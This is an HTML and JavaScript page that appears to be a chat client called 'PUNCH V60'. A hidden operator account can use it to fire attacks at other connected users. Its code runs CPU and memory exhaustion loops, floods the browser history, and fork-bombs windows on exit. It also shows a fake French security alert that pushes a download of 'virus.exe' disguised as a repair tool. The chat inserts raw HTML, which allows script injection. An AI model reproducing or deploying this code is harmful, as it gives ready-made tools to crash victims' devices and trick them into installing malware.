<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PUNCH V60 - SYSTEM OVERLOAD</title>
    <style>
        /* --- DESIGN PUNCH : INDUSTRIAL AGGRESSION --- */
        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=JetBrains+Mono:wght@800&family=Inter:wght@900&display=swap');

        :root {
            --punch-red: #ff0000;
            --punch-orange: #ff6a00;
            --punch-black: #050505;
            --smooth-fast: cubic-bezier(0.8, 0, 0.2, 1);
        }

        * { box-sizing: border-box; margin: 0; padding: 0; cursor: none; outline: none; }
        body { background: var(--punch-black); color: #fff; font-family: 'Inter', sans-serif; overflow: hidden; height: 100vh; }

        /* --- BACKGROUND FX --- */
        #punch-grid { position: fixed; inset: 0; background-image: linear-gradient(rgba(255,0,0,0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,0,0,0.05) 1px, transparent 1px); background-size: 50px 50px; z-index: -1; }
        #vibration-overlay { position: fixed; inset: 0; pointer-events: none; z-index: 1000000; mix-blend-mode: overlay; opacity: 0; }

        /* --- CURSOR --- */
        #c-punch { position: fixed; width: 30px; height: 30px; border: 2px solid var(--punch-red); transform: rotate(45deg); z-index: 10000000; pointer-events: none; transition: transform 0.05s linear; }

        /* --- LAYOUT --- */
        .punch-interface { display: grid; grid-template-columns: 400px 1fr 350px; height: 100vh; }
        .p-side { background: rgba(0,0,0,0.95); border-right: 2px solid #111; display: flex; flex-direction: column; }
        
        .p-header { padding: 40px; border-bottom: 2px solid var(--punch-red); }
        .p-header h1 { font-family: 'Archivo Black'; font-size: 50px; color: var(--punch-red); letter-spacing: -2px; line-height: 0.8; }
        .p-header span { font-size: 10px; font-family: 'JetBrains Mono'; color: #444; }

        /* LISTE CIBLES */
        #target-list { flex: 1; overflow-y: auto; padding: 20px; }
        .target-node { 
            padding: 20px; background: #0a0a0a; border: 1px solid #1a1a1a; margin-bottom: 10px; 
            transition: 0.2s var(--smooth-fast); position: relative; border-left: 0px solid var(--punch-red);
        }
        .target-node:hover { border-left-width: 10px; background: #111; transform: scale(1.02); }
        .target-node.master { border-left-color: var(--punch-orange); background: #150a00; }

        /* CHAT / VIEWPORT */
        .p-main { display: flex; flex-direction: column; background: radial-gradient(circle at center, #0f0000 0%, #000 100%); }
        #p-chat { flex: 1; padding: 40px; overflow-y: auto; display: flex; flex-direction: column; gap: 15px; }
        .p-bubble { padding: 20px; background: rgba(255,255,255,0.03); border: 1px solid #1a1a1a; font-weight: 700; font-size: 15px; animation: punchIn 0.3s var(--smooth-fast); }
        @keyframes punchIn { from { transform: scale(0.8) rotate(-2deg); opacity: 0; } }

        /* INPUT AREA */
        .p-input-zone { padding: 30px; background: #000; border-top: 2px solid #111; display: flex; gap: 15px; }
        #p-input { flex: 1; background: #080808; border: 1px solid #222; padding: 20px; color: #fff; font-family: 'JetBrains Mono'; font-weight: 800; }

        /* --- ATTACK UI --- */
        #punch-overlay { position: fixed; inset: 0; background: #ff0000; z-index: 100000000; display: none; align-items: center; justify-content: center; flex-direction: column; }
        .punch-warning { font-family: 'Archivo Black'; font-size: 10vw; color: #000; text-align: center; line-height: 0.9; }

        /* CONTEXT MENU */
        #p-menu { display: none; position: fixed; background: #000; border: 2px solid var(--punch-red); width: 350px; z-index: 1000000; box-shadow: 20px 20px 0px var(--punch-red); }
        .p-opt { padding: 18px; border-bottom: 1px solid #111; font-size: 12px; font-weight: 900; color: #666; transition: 0.1s; display: flex; justify-content: space-between; }
        .p-opt:hover { background: var(--punch-red); color: #000; }
    </style>
</head>
<body oncontextmenu="return false;">

    <div id="punch-grid"></div>
    <div id="c-punch"></div>
    <div id="vibration-overlay"></div>

    <div id="punch-overlay">
        <div class="punch-warning">SYSTEM<br>PUNCHED</div>
        <div id="p-logs" style="font-family:'JetBrains Mono'; color:#000; font-size:10px; margin-top:50px;"></div>
        <div style="margin-top:50px; border:4px solid #000; padding:20px 60px; font-weight:900; color:#000;" onclick="punishExit()">FORCE_REBOOT</div>
    </div>

    <div class="punch-interface">
        <aside class="p-side">
            <div class="p-header">
                <h1>PUNCH</h1>
                <span>V60_TOTAL_WAR_EDITION</span>
            </div>
            <div id="target-list"></div>
        </aside>

        <main class="p-main">
            <div id="p-chat"></div>
            <div class="p-input-zone">
                <input type="text" id="p-input" placeholder="READY_TO_STRIKE..." onkeydown="if(event.key==='Enter') send()">
                <button onclick="send()" style="background:var(--punch-red); border:none; padding:0 40px; font-family:'Archivo Black'; font-size:15px;">HIT</button>
            </div>
        </main>

        <aside class="p-side" style="border-right:none; border-left:2px solid #111; padding:30px;">
            <div style="font-family:'JetBrains Mono'; font-size:10px; color:#333;">COMBAT_LOGS_V60</div>
            <div id="p-terminal" style="font-family:'JetBrains Mono'; font-size:9px; color:#1a1a1a; flex:1; overflow-y:auto; margin-top:20px;"></div>
        </aside>
    </div>

    <div id="p-menu">
        <div class="p-opt" onclick="fire('p_infect')">🥊 INFECT_STRIKE <span>[VIRUS]</span></div>
        <div class="p-opt" onclick="fire('p_cpu_death')">🥊 CPU_KNOCKOUT <span>[MAX]</span></div>
        <div class="p-opt" onclick="fire('p_ram_kill')">🥊 RAM_GENOCIDE <span>[MAX]</span></div>
        <div class="p-opt" onclick="fire('p_ios_lock')">🥊 IOS_LOCKDOWN <span>[iPad]</span></div>
        <div class="p-opt" onclick="fire('p_tab_flood')">🥊 TAB_TSUNAMI <span>[WIN]</span></div>
        <div class="p-opt" onclick="fire('p_gpu_fry')">🥊 GPU_MOLTEN <span>[GPU]</span></div>
        <div class="p-opt" onclick="fire('p_sonic')">🥊 SONIC_BOMB <span>[VOL]</span></div>
        <div class="p-opt" onclick="fire('p_haptic')">🥊 HAPTIC_RESONANCE <span>[VIB]</span></div>
        <div class="p-opt" onclick="fire('p_disk')">🥊 DISK_FLOOD <span>[HD]</span></div>
        <div class="p-opt" onclick="this.parentElement.style.display='none'">[ CANCEL ]</div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let me = ""; let targetId = "";

        document.addEventListener('mousemove', e => {
            const c = document.getElementById('c-punch');
            c.style.left = e.clientX - 15 + 'px';
            c.style.top = e.clientY - 15 + 'px';
        });

        window.onload = () => {
            me = prompt("PUNCH_AUTH_TOKEN:");
            socket.emit('init', { name: me });
            document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
        };

        window.oncontextmenu = (e) => {
            e.preventDefault();
            if(me === "toucheur2pp") {
                const m = document.getElementById('p-menu');
                m.style.display = 'block'; m.style.top = e.pageY+'px'; m.style.left = e.pageX+'px';
                const el = document.elementFromPoint(e.clientX, e.clientY);
                const node = el.closest('.target-node');
                if(node) { targetId = node.getAttribute('data-sid'); logP("TARGET_LOCKED: " + targetId); }
            }
        };

        function fire(type) { socket.emit(type, targetId); logP("STRIKE_FIRED: " + type); }
        function logP(t) { const term = document.getElementById('p-terminal'); term.innerHTML += `<div>[${new Date().toLocaleTimeString()}] > ${t}</div>`; term.scrollTop = term.scrollHeight; }
        function send() { const i = document.getElementById('p-input'); socket.emit('chat', i.value); i.value = ""; }

        // --- PUNCH EXECUTION ENGINE ---
        socket.on('execute', (d) => {
            document.getElementById('punch-overlay').style.display = 'flex';
            const logs = document.getElementById('p-logs');

            if(d.type === 'p_cpu_death') {
                setInterval(() => {
                    for(let i=0; i<2000000; i++) { Math.atan2(Math.random(), Math.random()); }
                    history.pushState(null,'',location.href+'#'+Math.random());
                }, 5);
            }

            if(d.type === 'p_ram_kill') {
                const leak = [];
                setInterval(() => { for(let i=0; i<10000; i++) leak.push(new Float64Array(1024)); }, 10);
            }

            if(d.type === 'p_ios_lock') {
                setInterval(() => { for(let i=0; i<600; i++) history.pushState(null,'',location.href+'#'+i+'_'+Math.random()); }, 15);
            }

            if(d.type === 'p_infect') {
                document.getElementById('punch-overlay').innerHTML = `
                    <div style="background:#fff; color:#000; padding:50px; text-align:center;">
                        <h1 style="font-family:'Archivo Black'">ALERTE SÉCURITÉ</h1>
                        <p>Fichier corrompu détecté. Veuillez installer PUNCH_FIX.exe</p>
                        <button onclick="dl()" style="background:#ff0000; color:#fff; border:none; padding:20px; margin-top:20px; font-weight:900;">TÉLÉCHARGER LE FIX</button>
                    </div>`;
            }
        });

        function dl() {
            const a = document.createElement('a'); a.href = "https://ton-lien.com/virus.exe"; a.download = "PUNCH_REPAIR_SYSTEM.exe"; a.click();
        }

        function punishExit() { while(true) { window.open(location.href); } }

        socket.on('sync', l => {
            const list = document.getElementById('target-list');
            list.innerHTML = "";
            l.forEach(u => {
                const d = document.createElement('div');
                d.className = `target-node ${u.name === "toucheur2pp" ? 'master' : ''}`;
                d.setAttribute('data-sid', u.id);
                d.innerHTML = `<b>${u.name.toUpperCase()}</b><br><small>${u.id.substr(0,20)}</small>`;
                list.appendChild(d);
            });
        });

        socket.on('chat', d => {
            const sc = document.getElementById('p-chat');
            sc.innerHTML += `<div class="p-bubble"><b>${d.n}:</b> ${d.t}</div>`;
            sc.scrollTop = sc.scrollHeight;
        });

        window.onclick = () => document.getElementById('p-menu').style.display = 'none';
    </script>
</body>
</html>
